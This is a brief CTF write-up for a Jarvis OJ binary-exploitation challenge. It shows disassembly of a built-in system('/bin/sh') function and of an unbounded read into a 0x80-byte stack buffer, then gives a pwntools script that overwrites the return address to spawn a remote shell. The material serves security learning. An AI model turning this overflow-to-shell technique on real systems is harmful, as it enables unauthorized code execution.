## WP

nc pwn2.jarvisoj.com 9881

直接找到了 call system 贴心啊

```
.text:0000000000400596                 public callsystem
.text:0000000000400596 callsystem      proc near
.text:0000000000400596                 push    rbp
.text:0000000000400597                 mov     rbp, rsp
.text:000000000040059A                 mov     edi, offset command ; "/bin/sh"
.text:000000000040059F                 call    _system
.text:00000000004005A4                 pop     rbp
.text:00000000004005A5                 retn
.text:00000000004005A5 callsystem      endp
.text:00000000004005A5
.text:00000000004005A6

```

很简单的溢出，看一下:

```
.text:00000000004005A6 buf             = byte ptr -80h
.text:00000000004005A6
.text:00000000004005A6                 push    rbp
.text:00000000004005A7                 mov     rbp, rsp
.text:00000000004005AA                 add     rsp, 0FFFFFFFFFFFFFF80h
.text:00000000004005AE                 lea     rax, [rbp+buf]
.text:00000000004005B2                 mov     edx, 200h       ; nbytes
.text:00000000004005B7                 mov     rsi, rax        ; buf
.text:00000000004005BA                 mov     edi, 0          ; fd
.text:00000000004005BF                 call    _read
.text:00000000004005C4                 leave
.text:00000000004005C5                 retn
```

0x80个字节 + 8字节padding + return address 

## exploit

```
from pwn import *

HOST = 'pwn2.jarvisoj.com'
PORT = 9881
systemCallAddr = 0x400596


def PrettyTommy(ip,port):

        con = remote(ip,port)
        con.recv()
        print p64(systemCallAddr)
        payload= "A"*0x80+p64(systemCallAddr)+p64(systemCallAddr)
        con.send(payload)
        con.interactive("\nshell# ")


PrettyTommy(HOST,PORT)


```